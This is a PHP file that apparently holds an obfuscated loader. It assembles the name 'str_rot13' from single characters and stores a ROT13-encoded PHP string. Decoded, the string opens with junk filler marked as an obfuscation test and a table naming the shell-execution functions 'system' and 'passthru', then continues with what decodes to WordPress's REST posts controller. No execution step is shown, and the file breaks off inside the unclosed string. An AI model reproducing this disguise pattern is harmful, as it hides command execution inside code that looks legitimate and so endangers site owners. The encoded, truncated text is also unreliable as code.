<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cbfgf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff gb npprff cbfgf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Cbfgf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {
	/**
	 * Cbfg glcr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $cbfg_glcr;

	/**
	 * Vafgnapr bs n cbfg zrgn svryqf bowrpg.
	 *
	 * @fvapr 4.7.0
	 * @ine JC_ERFG_Cbfg_Zrgn_Svryqf
	 */
	cebgrpgrq $zrgn;

	/**
	 * Cnffjbeqyrff cbfg npprff crezvggrq.
	 *
	 * @fvapr 5.7.1
	 * @ine vag[]
	 */
	cebgrpgrq $cnffjbeq_purpx_cnffrq = neenl();

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 5.9.0
	 * @ine neenl
	 */
	cebgrpgrq $nyybj_ongpu = neenl( 'i1' => gehr );

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
	 */
	choyvp shapgvba __pbafgehpg( $cbfg_glcr ) {
		$guvf->cbfg_glcr = $cbfg_glcr;
		$bow             = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		$guvf->erfg_onfr = ! rzcgl( $bow->erfg_onfr ) ? $bow->erfg_onfr : $bow->anzr;
		$guvf->anzrfcnpr = ! rzcgl( $bow->erfg_anzrfcnpr ) ? $bow->erfg_anzrfcnpr : 'jc/i2';

		$guvf->zrgn = arj JC_ERFG_Cbfg_Zrgn_Svryqf( $guvf->cbfg_glcr );
	}

	/**
	 * Ertvfgref gur ebhgrf sbe cbfgf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::PERNGNOYR ),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		$fpurzn        = $guvf->trg_vgrz_fpurzn();
		$trg_vgrz_netf = neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
		vs ( vffrg( $fpurzn['cebcregvrf']['rkprecg'] ) ) {
			$trg_vgrz_netf['rkprecg_yratgu'] = neenl(
				'qrfpevcgvba' => __( 'Bireevqr gur qrsnhyg rkprecg yratgu.' ),
				'glcr'        => 'vagrtre',
			);
		}
		vs ( vffrg( $fpurzn['cebcregvrf']['cnffjbeq'] ) ) {
			$trg_vgrz_netf['cnffjbeq'] = neenl(
				'qrfpevcgvba' => __( 'Gur cnffjbeq sbe gur cbfg vs vg vf cnffjbeq cebgrpgrq.' ),
				'glcr'        => 'fgevat',
			);
		}
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'        => neenl(
					'vq' => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur cbfg.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $trg_vgrz_netf,
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Jurgure gb olcnff Genfu naq sbepr qryrgvba.' ),
						),
					),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq cbfgf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg cbfgf va guvf cbfg glcr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Bireevqrf gur erfhyg bs gur cbfg cnffjbeq purpx sbe ERFG erdhrfgrq cbfgf.
	 *
	 * Nyybj hfref gb ernq gur pbagrag bs cnffjbeq cebgrpgrq cbfgf vs gurl unir
	 * cerivbhfyl cnffrq n crezvffvba purpx be vs gurl unir gur `rqvg_cbfg` pncnovyvgl
	 * sbe gur cbfg orvat purpxrq.
	 *
	 * @fvapr 5.7.1
	 *
	 * @cnenz obby    $erdhverq Jurgure gur cbfg erdhverf n cnffjbeq purpx.
	 * @cnenz JC_Cbfg $cbfg     Gur cbfg orra cnffjbeq purpxrq.
	 * @erghea obby Erfhyg bs cnffjbeq purpx gnxvat vagb nppbhag ERFG NCV pbafvqrengvbaf.
	 */
	choyvp shapgvba purpx_cnffjbeq_erdhverq( $erdhverq, $cbfg ) {
		vs ( ! $erdhverq ) {
			erghea $erdhverq;
		}

		$cbfg = trg_cbfg( $cbfg );

		vs ( ! $cbfg ) {
			erghea $erdhverq;
		}

		vs ( ! rzcgl( $guvf->cnffjbeq_purpx_cnffrq[ $cbfg->VQ ] ) ) {
			// Cnffjbeq cerivbhfyl purpxrq naq nccebirq.
			erghea snyfr;
		}

		erghea ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs cbfgf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {

		// Rafher n frnepu fgevat vf frg va pnfr gur beqreol vf frg gb 'eryrinapr'.
		vs ( ! rzcgl( $erdhrfg['beqreol'] ) && 'eryrinapr' === $erdhrfg['beqreol'] && rzcgl( $erdhrfg['frnepu'] ) ) {
			erghea arj JC_Reebe(
				'erfg_ab_frnepu_grez_qrsvarq',
				__( 'Lbh arrq gb qrsvar n frnepu grez gb beqre ol eryrinapr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Rafher na vapyhqr cnenzrgre vf frg va pnfr gur beqreol vf frg gb 'vapyhqr'.
		vs ( ! rzcgl( $erdhrfg['beqreol'] ) && 'vapyhqr' === $erdhrfg['beqreol'] && rzcgl( $erdhrfg['vapyhqr'] ) ) {
			erghea arj JC_Reebe(
				'erfg_beqreol_vapyhqr_zvffvat_vapyhqr',
				__( 'Lbh arrq gb qrsvar na vapyhqr cnenzrgre gb beqre ol vapyhqr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();
		$netf       = neenl();

		/*
		 * Guvf neenl qrsvarf znccvatf orgjrra choyvp NCV dhrel cnenzrgref jubfr
		 * inyhrf ner npprcgrq nf-cnffrq, naq gurve vagreany JC_Dhrel cnenzrgre
		 * anzr rdhvinyragf (fbzr ner gur fnzr). Bayl inyhrf juvpu ner nyfb
		 * cerfrag va $ertvfgrerq jvyy or frg.
		 */
		$cnenzrgre_znccvatf = neenl(
			'nhgube'         => 'nhgube__va',
			'nhgube_rkpyhqr' => 'nhgube__abg_va',
			'rkpyhqr'        => 'cbfg__abg_va',
			'vapyhqr'        => 'cbfg__va',
			'vtaber_fgvpxl'  => 'vtaber_fgvpxl_cbfgf',
			'zrah_beqre'     => 'zrah_beqre',
			'bssfrg'         => 'bssfrg',
			'beqre'          => 'beqre',
			'beqreol'        => 'beqreol',
			'cntr'           => 'cntrq',
			'cnerag'         => 'cbfg_cnerag__va',
			'cnerag_rkpyhqr' => 'cbfg_cnerag__abg_va',
			'frnepu'         => 'f',
			'frnepu_pbyhzaf' => 'frnepu_pbyhzaf',
			'fyht'           => 'cbfg_anzr__va',
			'fgnghf'         => 'cbfg_fgnghf',
		);

		/*
		 * Sbe rnpu xabja cnenzrgre juvpu vf obgu ertvfgrerq naq cerfrag va gur erdhrfg,
		 * frg gur cnenzrgre'f inyhr ba gur dhrel $netf.
		 */
		sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
			vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
				$netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
			}
		}

		// Purpx sbe & nffvta nal cnenzrgref juvpu erdhver fcrpvny unaqyvat be frggvat.
		$netf['qngr_dhrel'] = neenl();

		vs ( vffrg( $ertvfgrerq['orsber'], $erdhrfg['orsber'] ) ) {
			$netf['qngr_dhrel'][] = neenl(
				'orsber' => $erdhrfg['orsber'],
				'pbyhza' => 'cbfg_qngr',
			);
		}

		vs ( vffrg( $ertvfgrerq['zbqvsvrq_orsber'], $erdhrfg['zbqvsvrq_orsber'] ) ) {
			$netf['qngr_dhrel'][] = neenl(
				'orsber' => $erdhrfg['zbqvsvrq_orsber'],
				'pbyhza' => 'cbfg_zbqvsvrq',
			);
		}

		vs ( vffrg( $ertvfgrerq['nsgre'], $erdhrfg['nsgre'] ) ) {
			$netf['qngr_dhrel'][] = neenl(
				'nsgre'  => $erdhrfg['nsgre'],
				'pbyhza' => 'cbfg_qngr',
			);
		}

		vs ( vffrg( $ertvfgrerq['zbqvsvrq_nsgre'], $erdhrfg['zbqvsvrq_nsgre'] ) ) {
			$netf['qngr_dhrel'][] = neenl(
				'nsgre'  => $erdhrfg['zbqvsvrq_nsgre'],
				'pbyhza' => 'cbfg_zbqvsvrq',
			);
		}

		// Rafher bhe cre_cntr cnenzrgre bireevqrf nal cebivqrq cbfgf_cre_cntr svygre.
		vs ( vffrg( $ertvfgrerq['cre_cntr'] ) ) {
			$netf['cbfgf_cre_cntr'] = $erdhrfg['cre_cntr'];
		}

		vs ( vffrg( $ertvfgrerq['fgvpxl'], $erdhrfg['fgvpxl'] ) ) {
			$fgvpxl_cbfgf = trg_bcgvba( 'fgvpxl_cbfgf', neenl() );
			vs ( ! vf_neenl( $fgvpxl_cbfgf ) ) {
				$fgvpxl_cbfgf = neenl();
			}
			vs ( $erdhrfg['fgvpxl'] ) {
				/*
				 * Nf cbfg__va jvyy or hfrq gb bayl trg fgvpxl cbfgf,
				 * jr unir gb fhccbeg gur pnfr jurer cbfg__va jnf nyernql
				 * fcrpvsvrq.
				 */
				$netf['cbfg__va'] = $netf['cbfg__va'] ? neenl_vagrefrpg( $fgvpxl_cbfgf, $netf['cbfg__va'] ) : $fgvpxl_cbfgf;

				/*
				 * Vs jr vagrefrpgrq, ohg gurer ner ab cbfg VQf va pbzzba,
				 * JC_Dhrel jba'g erghea \"ab cbfgf\" sbe cbfg__va = neenl()
				 * fb jr unir gb snxr vg n ovg.
				 */
				vs ( ! $netf['cbfg__va'] ) {
					$netf['cbfg__va'] = neenl( 0 );
				}
			} ryfrvs ( $fgvpxl_cbfgf ) {
				/*
				 * Nf cbfg___abg_va jvyy or hfrq gb bayl trg cbfgf gung
				 * ner abg fgvpxl, jr unir gb fhccbeg gur pnfr jurer cbfg__abg_va
				 * jnf nyernql fcrpvsvrq.
				 */
				$netf['cbfg__abg_va'] = neenl_zretr( $netf['cbfg__abg_va'], $fgvpxl_cbfgf );
			}
		}

		/*
		 * Ubabe gur bevtvany ERFG NCV `cbfg__va` orunivbe. Qba'g cercraq fgvpxl cbfgf
		 * jura `cbfg__va` unf orra fcrpvsvrq.
		 */
		vs ( ! rzcgl( $netf['cbfg__va'] ) ) {
			hafrg( $netf['vtaber_fgvpxl_cbfgf'] );
		}

		vs (
			vffrg( $ertvfgrerq['frnepu_frznagvpf'], $erdhrfg['frnepu_frznagvpf'] )
			&& 'rknpg' === $erdhrfg['frnepu_frznagvpf']
		) {
			$netf['rknpg'] = gehr;
		}

		$netf = $guvf->cercner_gnk_dhrel( $netf, $erdhrfg );

		vs ( vffrg( $ertvfgrerq['sbezng'], $erdhrfg['sbezng'] ) ) {
			$sbezngf = $erdhrfg['sbezng'];
			/*
			 * Gur eryngvba arrqf gb or frg gb `BE` fvapr gur erdhrfg pna pbagnva
			 * gjb frcnengr pbaqvgvbaf. Gur hfre znl or dhrelvat sbe vgrzf gung unir
			 * rvgure gur `fgnaqneq` sbezng be n fcrpvsvp sbezng.
			 */
			$sbezngf_dhrel = neenl( 'eryngvba' => 'BE' );

			/*
			 * Gur qrsnhyg cbfg sbezng, `fgnaqneq`, vf abg fgberq va gur qngnonfr.
			 * Vs `fgnaqneq` vf cneg bs gur erdhrfg, gur dhrel arrqf gb rkpyhqr nyy cbfg vgrzf gung
			 * unir n sbezng nffvtarq.
			 */
			vs ( va_neenl( 'fgnaqneq', $sbezngf, gehr ) ) {
				$sbezngf_dhrel[] = neenl(
					'gnkbabzl' => 'cbfg_sbezng',
					'svryq'    => 'fyht',
					'bcrengbe' => 'ABG RKVFGF',
				);
				// Erzbir gur `fgnaqneq` sbezng, fvapr vg pnaabg or dhrevrq.
				hafrg( $sbezngf[ neenl_frnepu( 'fgnaqneq', $sbezngf, gehr ) ] );
			}

			// Nqq nal erznvavat sbezngf gb gur sbezngf dhrel.
			vs ( ! rzcgl( $sbezngf ) ) {
				// Nqq gur `cbfg-sbezng-` cersvk.
				$grezf = neenl_znc(
					fgngvp shapgvba ( $sbezng ) {
						erghea \"cbfg-sbezng-$sbezng\";
					},
					$sbezngf
				);

				$sbezngf_dhrel[] = neenl(
					'gnkbabzl' => 'cbfg_sbezng',
					'svryq'    => 'fyht',
					'grezf'    => $grezf,
					'bcrengbe' => 'VA',
				);
			}

			// Ranoyr svygrevat ol obgu cbfg sbezngf naq bgure gnkbabzvrf ol pbzovavat gurz jvgu `NAQ`.
			vs ( vffrg( $netf['gnk_dhrel'] ) ) {
				$netf['gnk_dhrel'][] = neenl(
					'eryngvba' => 'NAQ',
					$sbezngf_dhrel,
				);
			} ryfr {
				$netf['gnk_dhrel'] = $sbezngf_dhrel;
			}
		}

		// Sbepr gur cbfg_glcr nethzrag, fvapr vg'f abg n hfre vachg inevnoyr.
		$netf['cbfg_glcr'] = $guvf->cbfg_glcr;

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );
		vs ( $vf_urnq_erdhrfg ) {
			// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl cbfg VQf ner erdhverq gb pnyphyngr cntvangvba.
			$netf['svryqf'] = 'vqf';
			// Qvfnoyr cevzvat cbfg zrgn sbe URNQ erdhrfgf gb vzcebir cresbeznapr.
			$netf['hcqngr_cbfg_grez_pnpur'] = snyfr;
			$netf['hcqngr_cbfg_zrgn_pnpur'] = snyfr;
		}

		/**
		 * Svygref JC_Dhrel nethzragf jura dhrelvat cbfgf ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cbfg_dhrel`
		 *  - `erfg_cntr_dhrel`
		 *  - `erfg_nggnpuzrag_dhrel`
		 *
		 * Ranoyrf nqqvat rkgen nethzragf be frggvat qrsnhygf sbe n cbfg pbyyrpgvba erdhrfg.
		 *
		 * @fvapr 4.7.0
		 * @fvapr 5.7.0 Zbirq nsgre gur `gnk_dhrel` dhrel net vf trarengrq.
		 *
		 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_dhrel/
		 *
		 * @cnenz neenl           $netf    Neenl bs nethzragf sbe JC_Dhrel.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur ERFG NCV erdhrfg.
		 */
		$netf       = nccyl_svygref( \"erfg_{$guvf->cbfg_glcr}_dhrel\", $netf, $erdhrfg );
		$dhrel_netf = $guvf->cercner_vgrzf_dhrel( $netf, $erdhrfg );

		$cbfgf_dhrel  = arj JC_Dhrel();
		$dhrel_erfhyg = $cbfgf_dhrel->dhrel( $dhrel_netf );

		// Nyybj npprff gb nyy cnffjbeq cebgrpgrq cbfgf vs gur pbagrkg vf rqvg.
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			nqq_svygre( 'cbfg_cnffjbeq_erdhverq', neenl( $guvf, 'purpx_cnffjbeq_erdhverq' ), 10, 2 );
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			$cbfgf = neenl();

			hcqngr_cbfg_nhgube_pnpurf( $dhrel_erfhyg );
			hcqngr_cbfg_cnerag_pnpurf( $dhrel_erfhyg );

			vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'guhzoanvy' ) ) {
				hcqngr_cbfg_guhzoanvy_pnpur( $cbfgf_dhrel );
			}

			sbernpu ( $dhrel_erfhyg nf $cbfg ) {
				vs ( ! $guvf->purpx_ernq_crezvffvba( $cbfg ) ) {
					pbagvahr;
				}

				$qngn    = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
				$cbfgf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		// Erfrg svygre.
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			erzbir_svygre( 'cbfg_cnffjbeq_erdhverq', neenl( $guvf, 'purpx_cnffjbeq_erdhverq' ) );
		}

		$cntr        = vffrg( $dhrel_netf['cntrq'] ) ? (vag) $dhrel_netf['cntrq'] : 0;
		$gbgny_cbfgf = $cbfgf_dhrel->sbhaq_cbfgf;

		vs ( $gbgny_cbfgf < 1 && $cntr > 1 ) {
			// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
			hafrg( $dhrel_netf['cntrq'] );

			$pbhag_dhrel = arj JC_Dhrel();
			$pbhag_dhrel->dhrel( $dhrel_netf );
			$gbgny_cbfgf = $pbhag_dhrel->sbhaq_cbfgf;
		}

		$znk_cntrf = (vag) prvy( $gbgny_cbfgf / (vag) $cbfgf_dhrel->dhrel_inef['cbfgf_cre_cntr'] );

		vs ( $cntr > $znk_cntrf && $gbgny_cbfgf > 0 ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_vainyvq_cntr_ahzore',
				__( 'Gur cntr ahzore erdhrfgrq vf ynetre guna gur ahzore bs cntrf ninvynoyr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $cbfgf );

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_cbfgf );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', (vag) $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$pbyyrpgvba_hey = erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( $guvf->cbfg_glcr ) );
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), $pbyyrpgvba_hey );

		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trgf gur cbfg, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cbfg( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_cbfg_vainyvq_vq',
			__( 'Vainyvq cbfg VQ.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $vq <= 0 ) {
			erghea $reebe;
		}

		$cbfg = trg_cbfg( (vag) $vq );
		vs ( rzcgl( $cbfg ) || rzcgl( $cbfg->VQ ) || $guvf->cbfg_glcr !== $cbfg->cbfg_glcr ) {
			erghea $reebe;
		}

		erghea $cbfg;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg be snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && $cbfg && ! $guvf->purpx_hcqngr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( $cbfg && ! rzcgl( $erdhrfg->trg_dhrel_cnenzf()['cnffjbeq'] ) ) {
			// Purpx cbfg cnffjbeq, naq erghea reebe vs vainyvq.
			vs ( ! unfu_rdhnyf( $cbfg->cbfg_cnffjbeq, $erdhrfg->trg_dhrel_cnenzf()['cnffjbeq'] ) ) {
				erghea arj JC_Reebe(
					'erfg_cbfg_vapbeerpg_cnffjbeq',
					__( 'Vapbeerpg cbfg cnffjbeq.' ),
					neenl( 'fgnghf' => 403 )
				);
			}
		}

		// Nyybj npprff gb nyy cnffjbeq cebgrpgrq cbfgf vs gur pbagrkg vf rqvg.
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			nqq_svygre( 'cbfg_cnffjbeq_erdhverq', neenl( $guvf, 'purpx_cnffjbeq_erdhverq' ), 10, 2 );
		}

		vs ( $cbfg ) {
			erghea $guvf->purpx_ernq_crezvffvba( $cbfg );
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs gur hfre pna npprff cnffjbeq-cebgrpgrq pbagrag.
	 *
	 * Guvf zrgubq qrgrezvarf jurgure jr arrq gb bireevqr gur erthyne cnffjbeq
	 * purpx va pber jvgu n svygre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg gb purpx ntnvafg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg qngn gb purpx.
	 * @erghea obby Gehr vs gur hfre pna npprff cnffjbeq-cebgrpgrq pbagrag, bgurejvfr snyfr.
	 */
	choyvp shapgvba pna_npprff_cnffjbeq_pbagrag( $cbfg, $erdhrfg ) {
		vs ( rzcgl( $cbfg->cbfg_cnffjbeq ) ) {
			// Ab svygre erdhverq.
			erghea snyfr;
		}

		/*
		 * Hfref nyjnlf trgf npprff gb cnffjbeq cebgrpgrq pbagrag va gur rqvg
		 * pbagrkg vs gurl unir gur `rqvg_cbfg` zrgn pncnovyvgl.
		 */
		vs (
			'rqvg' === $erdhrfg['pbagrkg'] &&
			pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ )
		) {
			erghea gehr;
		}

		// Ab cnffjbeq, ab nhgu.
		vs ( rzcgl( $erdhrfg['cnffjbeq'] ) ) {
			erghea snyfr;
		}

		// Qbhoyr-purpx gur erdhrfg cnffjbeq.
		erghea unfu_rdhnyf( $cbfg->cbfg_cnffjbeq, $erdhrfg['cnffjbeq'] );
	}

	/**
	 * Ergevrirf n fvatyr cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		$qngn     = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( vf_cbfg_glcr_ivrjnoyr( trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr ) ) ) {
			$erfcbafr->yvax_urnqre( 'nygreangr', trg_creznyvax( $cbfg->VQ ), neenl( 'glcr' => 'grkg/ugzy' ) );
		}

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr n cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['vq'] ) ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_rkvfgf',
				__( 'Pnaabg perngr rkvfgvat cbfg.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( ! rzcgl( $erdhrfg['nhgube'] ) && trg_pheerag_hfre_vq() !== $erdhrfg['nhgube'] && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg_bguref',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr cbfgf nf guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! rzcgl( $erdhrfg['fgvpxl'] ) && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) && ! pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_nffvta_fgvpxl',
